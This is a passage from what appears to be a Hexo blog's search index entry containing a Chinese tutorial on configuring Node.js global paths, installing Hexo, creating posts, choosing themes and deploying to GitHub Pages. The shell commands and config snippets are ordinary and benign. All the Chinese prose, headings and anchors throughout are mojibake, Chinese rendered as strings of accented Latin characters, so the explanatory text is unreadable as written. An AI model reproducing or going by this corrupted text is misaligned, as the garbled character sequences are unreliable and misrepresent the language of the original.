&quot;node_cacheè·¯å¾„&quot;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤æ¡å‘½ä»¤ä¿®æ”¹äº†å­˜æ”¾è·¯å¾„ï¼Œä½†æ˜¯è¿˜è¦ä¿®æ”¹ç¯å¢ƒå˜é‡ç³»ç»Ÿæ‰çŸ¥é“</p></li><li><p>ç³»ç»Ÿå˜é‡æ·»åŠ NODE_PATHï¼Œè·¯å¾„ä¸ºnode_globalä¸‹çš„node_modulesï¼›ç”¨æˆ·å˜é‡çš„è·¯å¾„ä¸­æ·»åŠ node_globalçš„è·¯å¾„å³å¯<img src="http://cdn.clown2024.cn/202407151440886.png" alt="8"></p><p><img src="http://cdn.clown2024.cn/202407151510140.png" alt="2"></p></li><li><p>ç”¨npm root -g å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æˆåŠŸäº†<img src="http://cdn.clown2024.cn/202407151510141.png"></p></li></ol></li></ol><h1 id="åˆ›å»ºä»“åº“"><a href="#åˆ›å»ºä»“åº“" class="headerlink" title="åˆ›å»ºä»“åº“"></a>åˆ›å»ºä»“åº“</h1><p>è¿™é‡Œæœæœæ•™ç¨‹å°±å¥½äº†ã€‚</p><h1 id="å®‰è£…hexo"><a href="#å®‰è£…hexo" class="headerlink" title="å®‰è£…hexo"></a>å®‰è£…hexo</h1><p>å»hexoçš„å®˜ç½‘ä¼šæœ‰å®‰è£…å‘½ä»¤ï¼Œå¦‚ä¸‹æŒ‰é¡ºåºæ‰§è¡Œï¼š</p><blockquote><p>åœ¨æ­¤ä¹‹å‰å…ˆæ–°å»ºæ–‡ä»¶å¤¹åœ¨æˆ‘ä»¬è¦çš„åšå®¢ç›®å½•ä¸‹ï¼Œåœ¨è¯¥ç›®å½•æ‰“å¼€git bash<img src="http://cdn.clown2024.cn/202407151510142.png"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm install hexo-cli -g<br>hexo init blog<br>cd blog<br>npm install<br>hexo server //ä¹Ÿå¯ä»¥ç¼©å†™æˆhexo s<br></code></pre></td></tr></table></figure><blockquote><p>æ‰€æœ‰æ“ä½œåœ¨gitæ§åˆ¶å°æ“ä½œå°±å¥½ï¼Œä¸éœ€è¦Windowsçš„æ§åˆ¶å°ï¼Œå› ä¸ºä¼šè£…åˆ°ä¸Šé¢è¿™æ˜¯å…¨å±€åŒ…é‚£é‡Œçš„ç›®å½•</p></blockquote><p>è¾“å…¥ç¬¬äº”è¡Œå‘½ä»¤ä¹‹åå°±å¯ä»¥çœ‹åˆ°åšå®¢åœ°å€ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151510143.png"></p><p>è¿›è¡Œç½‘é¡µä¹‹åä¼šç»™æˆ‘ä»¬ä¸€äº›å‘½ä»¤æç¤ºï¼š</p><p><img src="http://cdn.clown2024.cn/202407151510144.png"></p><h1 id="æ—¥å¸¸æ“ä½œä½¿ç”¨"><a href="#æ—¥å¸¸æ“ä½œä½¿ç”¨" class="headerlink" title="æ—¥å¸¸æ“ä½œä½¿ç”¨"></a>æ—¥å¸¸æ“ä½œä½¿ç”¨</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo new &lt;æ–‡ç« æ ‡é¢˜&gt;<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ç¯‡æ–°æ–‡ç« ï¼Œå¯ä»¥åœ¨source&#x2F;_postsæ–‡ä»¶å¤¹ä¸­çœ‹åˆ°æ–‡ç« çš„æ–‡ä»¶ï¼Œæ˜¯mdæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo generate//ä¹Ÿå¯ä»¥å†™æˆ hexo g<br></code></pre></td></tr></table></figure><p>ç”¨äºç”Ÿæˆé™æ€ç½‘é¡µï¼Œåœ¨æ›´æ”¹åšå®¢åå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œä½†åˆ·æ–°ä¸€ä¸‹ç½‘é¡µå…¶å®ä¹Ÿå¯ä»¥</p><h1 id="ä¿®æ”¹ä¸»é¢˜"><a href="#ä¿®æ”¹ä¸»é¢˜" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜"></a>ä¿®æ”¹ä¸»é¢˜</h1><p>æˆ‘ä»¬å¯ä»¥å»hexoå®˜ç½‘ç‚¹å‡»ä¸‹é¢çš„æ¢ç´¢ä¸»é¢˜æ‰¾è‡ªå·±æƒ³è¦çš„ä¸»é¢˜;é€‰å¥½ä¹‹åå°±ä¼šè·³åˆ°ä¸»é¢˜çš„githubç½‘é¡µï¼Œé‡Œé¢æœ‰è¯¦ç»†è¯´æ˜å¯ä»¥è‡ªå·±çœ‹</p><h1 id="å‘å¸ƒåˆ°github-pages"><a href="#å‘å¸ƒåˆ°github-pages" class="headerlink" title="å‘å¸ƒåˆ°github pages"></a>å‘å¸ƒåˆ°github pages</h1><p>å®‰è£…hexo-deployer-git</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬éœ€è¦å»ä¿®æ”¹_config.ymlä¸‹çš„æ–‡ä»¶çš„deployé€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deploy:<br>  type: git<br>  repo: https://github.com/clowsman/clowsman.github.io.git<br>  branch: main<br>  token: <br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„å†’å·åä¸€å®šè¦ç©ºæ ¼</p></blockquote><p>ä½†æ˜¯ä¸Šé¢ä½¿ç”¨tokençš„æ–¹å¼æˆ‘çš„ä¼šæŠ¥é”™ï¼Œå¯èƒ½æ˜¯repoåœ°å€çš„é—®é¢˜ï¼Œæ‰€ä»¥æ”¹æˆsshçš„æ–¹å¼æ¥è¯•ä¸€è¯•ï¼Œsshå°±å¯ä»¥ä¸è¦tokenäº†</p><p><img src="http://cdn.clown2024.cn/202407151510145.png"></p><p>å¤åˆ¶è¯¥sshåœ°å€å³å¯</p><blockquote><p>ä½¿ç”¨ä¹‹å‰è®°å¾—å°†gitç»‘å®šssh</p></blockquote><h1 id="æ–‡ç« å¤´éƒ¨çš„ä¸€äº›å…³é”®å­—"><a href="#æ–‡ç« å¤´éƒ¨çš„ä¸€äº›å…³é”®å­—" class="headerlink" title="æ–‡ç« å¤´éƒ¨çš„ä¸€äº›å…³é”®å­—"></a>æ–‡ç« å¤´éƒ¨çš„ä¸€äº›å…³é”®å­—</h1><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th><th align="left">é»˜è®¤å€¼</th></tr></thead><tbody><tr><td align="left"><code>layout</code></td><td align="left">å¸ƒå±€</td><td align="left"><a href="https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0"><code>config.default_layout</code></a></td></tr><tr><td align="left"><code>title</code></td><td align="left">æ ‡é¢˜</td><td align="left">æ–‡ç« çš„æ–‡ä»¶å</td></tr><tr><td align="left"><code>date</code></td><td align="left">å»ºç«‹æ—¥æœŸ</td><td align="left">æ–‡ä»¶å»ºç«‹æ—¥æœŸ</td></tr><tr><td align="left"><code>updated</code></td><td align="left">æ›´æ–°æ—¥æœŸ</td><td align="left">æ–‡ä»¶æ›´æ–°æ—¥æœŸ</td></tr><tr><td align="left"><code>comments</code></td><td align="left">å¼€å¯æ–‡ç« çš„è¯„è®ºåŠŸèƒ½</td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>tags</code></td><td align="left">æ ‡ç­¾ï¼ˆä¸é€‚ç”¨äºåˆ†é¡µï¼‰</td><td align="left"></td></tr><tr><td align="left"><code>categories</code></td><td align="left">åˆ†ç±»ï¼ˆä¸é€‚ç”¨äºåˆ†é¡µï¼‰</td><td align="left"></td></tr><tr><td align="left"><code>permalink</code></td><td align="left">è¦†ç›–æ–‡ç« çš„æ°¸ä¹…é“¾æ¥ï¼Œæ°¸ä¹…é“¾æ¥åº”è¯¥ä»¥ <code>/</code> æˆ– <code>.html</code> ç»“å°¾</td><td align="left"><code>null</code></td></tr><tr><td align="left"><code>excerpt</code></td><td align="left">çº¯æ–‡æœ¬çš„é¡µé¢æ‘˜è¦ã€‚ä½¿ç”¨ <a href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD">è¯¥æ’ä»¶</a> æ¥æ ¼å¼åŒ–æ–‡æœ¬</td><td align="left"></td></tr><tr><td align="left"><code>disableNunjucks</code></td><td align="left">å¯ç”¨æ—¶ç¦ç”¨ Nunjucks æ ‡ç­¾ <code>&#123;&#123; &#125;&#125;</code>&#x2F;<code>&#123;% %&#125;</code> å’Œ <a href="https://hexo.io/zh-cn/docs/tag-plugins">æ ‡ç­¾æ’ä»¶</a> çš„æ¸²æŸ“åŠŸèƒ½</td><td align="left">false</td></tr><tr><td align="left"><code>lang</code></td><td align="left">è®¾ç½®è¯­è¨€ä»¥è¦†ç›– <a href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84">è‡ªåŠ¨æ£€æµ‹</a></td><td align="left">ç»§æ‰¿è‡ª <code>_config.yml</code></td></tr><tr><td align="left"><code>published</code></td><td align="left">æ–‡ç« æ˜¯å¦å‘å¸ƒ</td><td align="left">å¯¹äº <code>_posts</code> ä¸‹çš„æ–‡ç« ä¸º <code>true</code>ï¼Œå¯¹äº <code>_draft</code> ä¸‹çš„æ–‡ç« ä¸º <code>false</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åšå®¢ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>